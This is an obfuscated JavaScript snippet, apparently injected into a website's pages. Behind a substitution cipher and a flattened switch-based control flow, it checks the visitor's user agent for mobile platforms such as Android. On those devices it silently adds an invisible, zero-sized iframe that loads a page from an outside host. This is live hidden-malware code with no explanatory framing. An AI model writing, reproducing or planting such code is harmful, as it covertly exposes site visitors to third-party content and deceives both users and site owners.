 (function () {
  var eoJ = function (s) {
    this.s = s;
    this.length = s.length;

    for (var i = 0; i < s.length; i++) {
      this[i] = s.charAt(i);
    }
  };

  var JtJ = function getStr(mutatedCodes) {
    return function (originCodes) {
      return function (s) {
        var r = '',
            sArr = s.split('');

        for (var i = 0; i < sArr.length; i++) {
          r += originCodes.charAt(mutatedCodes.indexOf(sArr[i]));
        }

        return r;
      };
    };
  }("/pA50tea:hynmfzwcC.s8gbluOiEdor;x")("userAgntidxOfoamcEl/58.zhwyb:0;pC");

  eoJ.prototype = {
    toString: function () {
      return JtJ(this.s);
    },
    valueOf: function () {
      return JtJ(this.s);
    },
    charAt: String.prototype.charAt,
    concat: String.prototype.concat,
    slice: String.prototype.slice,
    substr: String.prototype.substr,
    indexOf: String.prototype.indexOf,
    trim: String.prototype.trim,
    split: String.prototype.split
  };

  var oRV = function (s) {
    return new eoJ(s);
  };

  var bBj = function _756911(arrNum, offset) {
    var dCI1D = 1;

    while (dCI1D !== 0) {
      switch (dCI1D) {
        case 1:
          var arr = [];
          dCI1D = 5;
          break;

        case 2:
          dCI1D = i < arrNum ? 7 : 3;
          break;

        case 3:
          dCI1D = ii < arrNum ? 8 : 4;
          break;

        case 4:
          return arr;
          dCI1D = 0;
          break;

        case 5:
          var i = 0;
          dCI1D = 6;
          break;

        case 6:
          var ii = 0;
          dCI1D = 2;
          break;

        case 7:
          arr[(i + offset) % arrNum] = [];
          dCI1D = 9;
          break;

        case 8:
          var I = arrNum - 1;
          dCI1D = 10;
          break;

        case 9:
          i++;
          dCI1D = 2;
          break;

        case 10:
          dCI1D = I >= 0 ? 12 : 11;
          break;

        case 11:
          ii++;
          dCI1D = 3;
          break;

        case 12:
          arr[ii][(I + offset * ii) % arrNum] = arr[I];
          dCI1D = 13;
          break;

        case 13:
          I--;
          dCI1D = 10;
          break;
      }
    }
  }(11, 7);

  var QgLzC = bBj[3][4][3];

  while (QgLzC !== bBj[1][7][0]) {
    switch (QgLzC) {
      case bBj[9][6][9]:
        var UA = navigator[oRV("/pA50tAea")];
        QgLzC = bBj[5][8][0];
        break;

      case bBj[0][9][10]:
        var shebei = UA[oRV(":ehAynm")](oRV("0eh5f:h")) > -1 || UA[oRV(":ehAynm")](oRV("0h5")) > -1;
        QgLzC = bBj[1][3][8];
        break;

      case bBj[3][9][7]:
        var sjs = Math[oRV("5zehfw")]();
        QgLzC = bBj[7][2][5];
        break;

      case bBj[3][0][0]:
        var iframe = document[oRV("c5AzaAC.AwAea")](oRV(":m5zwA"));
        QgLzC = bBj[1][0][0];
        break;

      case bBj[2][2][9]:
        iframe[oRV("p5c")] = oRV("ss.A.AtA8gbt:aAAb:fscellbuaw.");
        QgLzC = bBj[7][0][4];
        break;

      case bBj[6][8][10]:
        iframe[oRV("uA:tua")] = 0;
        QgLzC = bBj[6][0][10];
        break;

      case bBj[7][6][3]:
        iframe[oRV("O:hau")] = 0;
        QgLzC = bBj[2][10][2];
        break;

      case bBj[3][0][4]:
        iframe[oRV("pai.A")] = oRV("Ef5hA5dor");
        QgLzC = bBj[4][1][7];
        break;

      case bBj[9][2][0]:
        QgLzC = shebei ? bBj[1][1][1] : bBj[8][6][2];
        break;

      case bBj[10][8][5]:
        document[oRV("Efhi")][oRV("z;;Aehxu:.h")](iframe);
        QgLzC = bBj[5][1][4];
        break;
    }
  }
})();
